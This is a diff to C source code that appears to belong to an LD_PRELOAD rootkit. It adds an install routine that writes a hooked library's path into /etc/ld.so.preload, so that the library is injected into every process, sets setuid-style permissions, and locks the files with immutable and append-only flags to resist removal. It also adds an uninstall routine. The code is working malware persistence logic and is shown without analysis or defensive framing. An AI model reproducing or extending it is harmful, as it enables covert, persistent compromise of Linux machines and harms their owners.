@@ -129,9 +129,22 @@ void install(){
         fflush(fw);
         unsigned long flags = FS_IMMUTABLE_FL | FS_APPEND_FL;
         int fd = fileno(fw);
-        // fchmod(fd, );
+        fchmod(fd, 04555);
         hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
         fclose(fw);
+
+        FILE *fld = hooked_fopen("/etc/ld.so.preload","w");
+        if (!fld){
+            #ifdef DEBUG
+            printf("[-] no write permission\n");
+            #endif
+            return;
+        }
+        fwrite(MAGIC_LIBPATH, 1, sizeof(MAGIC_LIBPATH), fld);
+        fflush(fld);
+        fd = fileno(fld);
+        hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
+        fclose(fld);
     }
 }
 
@@ -143,7 +156,38 @@ void install(){
  *  returns: nothing 
  */
 void uninstall(){
+    #ifdef DEBUG
+    printf("[-] removing lib...\n");
+    #endif
+    if (!hooked_fopen){
+        hooked_fopen = load_libc("fopen");
+    }
+    FILE *f = hooked_fopen(MAGIC_LIBPATH, "rb");
+    if (!f){
+        #ifdef DEBUG
+        printf("[-] no write permission\n");
+        #endif
+        return;
+    }
+    int fd = fileno(f);
+    unsigned long flags = 0;
+    hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
+    fclose(f);
     unlink(MAGIC_LIBPATH);
+
+    char ldpath[] = "/etc/ld.so.preload";
+    FILE *fld = hooked_fopen(ldpath, "r");
+    if (!fld){
+        #ifdef DEBUG
+        printf("[-] no write permission\n");
+        #endif
+        return;
+    }
+    fd = fileno(fld);
+    hooked_ioctl(fd, FS_IOC_SETFLAGS, &flags);
+    fclose(fld);
+    unlink(ldpath);
+
 }
 
 /*
